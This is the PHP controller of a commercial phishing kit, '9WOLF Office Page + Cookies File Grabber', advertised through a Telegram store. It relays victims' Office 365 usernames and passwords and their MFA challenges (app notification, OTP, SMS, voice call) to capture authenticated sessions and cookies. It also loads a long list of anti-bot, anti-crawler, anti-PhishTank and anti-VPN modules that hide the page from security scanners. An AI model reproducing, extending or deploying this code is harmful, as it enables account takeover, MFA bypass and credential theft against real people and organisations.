<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "../site/";
require ("../9WOLFConfi/Guration.php");
require ("../9WOLFConfi/Function.php");
require ("../9WOLFDecline/AntiBotIp.php");
require ("../9WOLFDecline/AntiBotPw.php");
require ("../9WOLFDecline/AntiBotKillBot.php");
require ("../9WOLFDecline/AntiBotUserAgent.php");
require ("../9WOLFDecline/AntiBotIsp.php");
require ("../9WOLFDecline/AnitiBotHost.php");
require ("../9WOLFDecline/AntiBotPhishTank.php");
require ("../9WOLFDecline/AntiBotVpn.php");
require ("../9WOLFDecline/AntiBotProxy.php");
require ("../9WOLFDecline/AntBotProtection.php");
require ("../9WOLFDecline/SaveBrowsing.php");
require ("../9WOLFDecline/DiscoveredBot.php");
require ("../9WOLFDecline/AntiBotThree.php");
require ("../9WOLFDecline/DisturbOne.php");
require ("../9WOLFDecline/DisturbTwo.php");
require("../9WOLFDecline/Anti/Bot-Crawler.php");
@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
$rand = generateRandomString(130);
$cage = substr(sha1(mt_rand()),1,25);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}


$action = $_POST['do'];



if ($action == 'check') {

    $email = $_POST['email'];

    $result = getDetailEmail($email);

    echo json_encode($result);

} else if ($action == 'login') {

    $login = loginOffice($_POST['user'], $_POST['pass']);

    $user = $_POST['user'];

    if ($login['status'] == 'error') {

        header("Location: index.php?error&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']));

    } else if ($login['status'] == 'success') {

        header("Location: f1n4l?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']));

    } else if ($login['status'] == 'verify') {

        header("Location: c4t10n?m4!n&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']) . "&token=" . $login['data'] . "&method=" . $login['method'] . "&key=" . $login['key']);

    }

} else if ($action == 'verify') {

    $token = json_decode(base64_decode($_POST['token']), true);

    $bg = base64_encode($_POST['bg']);

    $logo = base64_encode($_POST['logo']);

    $method = $_POST['method'];

    $user = $_POST['user'];

    $key = $_POST['key'];



    $redirect = '';

    if ($method == 'PhoneAppNotification') {

        $redirect = 'phoneappnotif';

    } else if ($method == 'PhoneAppOTP') {

        $redirect = 'phoneappotp';

    } else if ($method == 'OneWaySMS') {

        $redirect = 'sms';

    } else if ($method == 'TwoWayVoiceMobile') {

        $redirect = 'twoawaysms';

    }



    $beginAuth = beginAuthOffice($method, $token['ctx'], $token['flowToken'], $token['canary'], $token['cookie']);



    if ($beginAuth['Success']) {
        $users =  base64_encode($beginAuth['Entropy']);

        $token = base64_encode(json_encode([

            'ctx' => $beginAuth['Ctx'],

            'flowToken' => $beginAuth['FlowToken'],

            'cookie' => $token['cookie'],

            'method' => $method,
            
            'Entropy' => $beginAuth['Entropy'],
             
            'session' => $beginAuth['SessionId']

        ]));



        echo json_encode([

            'status' => true,

            'data' => $token,

            'redirect' => "?$redirect&user=$user&users=$users&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=$bg&logo=$logo&token=$token&key=$key"

        ]);

    } else {

        echo json_encode(['status' => false, 'message' => 'Verification request failed']);

    }

} else if ($action == 'checkVerify') {

    $user = $_POST['user'];


    $token = json_decode(base64_decode($_POST['token']), true);



    if ($_POST['service'] == 'notif') {

        $endAuth = EndAuthOffice($_POST['token']);

        $newToken = base64_encode(json_encode([

            'ctx' => $endAuth['Ctx'],

            'flowToken' => $endAuth['FlowToken'],

            'cookie' => $token['cookie'],

            'method' => $token['method'],
            

            'session' => $endAuth['SessionId']

        ]));

        if ($endAuth['Success']) {

            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);



            echo json_encode([

                'status' => true,

                'redirect' => "../f1n4l?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])

            ]);

        } else {

            echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);

        }

    } else if ($_POST['service'] == 'sms') {

        $endAuth = EndAuthOffice($_POST['token'], $_POST['otc']);

        $newToken = base64_encode(json_encode([

            'ctx' => $endAuth['Ctx'],

            'flowToken' => $endAuth['FlowToken'],

            'cookie' => $token['cookie'],

            'method' => $token['method'],

            'session' => $endAuth['SessionId']

        ]));

        if ($endAuth['Success']) {

            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);



            header("Location: f1n4l?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']));

        } else {

            header("Location: c4t10n/?sms&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']) . "&token=$newToken&error&key=" . $_POST['key']);

        }

    } else if ($_POST['service'] == 'code') {

        $endAuth = EndAuthOffice($_POST['token'], $_POST['otc']);

        $newToken = base64_encode(json_encode([

            'ctx' => $endAuth['Ctx'],

            'flowToken' => $endAuth['FlowToken'],

            'cookie' => $token['cookie'],

            'method' => $token['method'],

            'session' => $endAuth['SessionId']

        ]));

        if ($endAuth['Success']) {

            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);



            header("Location: f1n4l?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']));

        } else {

            header("Location: c4t10n/?phoneappotp&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']) . "&token=$newToken&error&key=" . $_POST['key']);

        }

    } else if ($_POST['service'] == 'call') {

        $endAuth = EndAuthOffice($_POST['token'], '');

        $newToken = base64_encode(json_encode([

            'ctx' => $endAuth['Ctx'],

            'flowToken' => $endAuth['FlowToken'],

            'cookie' => $token['cookie'],

            'method' => $token['method'],

            'session' => $endAuth['SessionId']

        ]));

        if ($endAuth['Success']) {

            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);



            echo json_encode([

                'status' => true,

                'redirect' => "../f1n4l?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])

            ]);

        } else {

            echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);

        }

    }

}

?>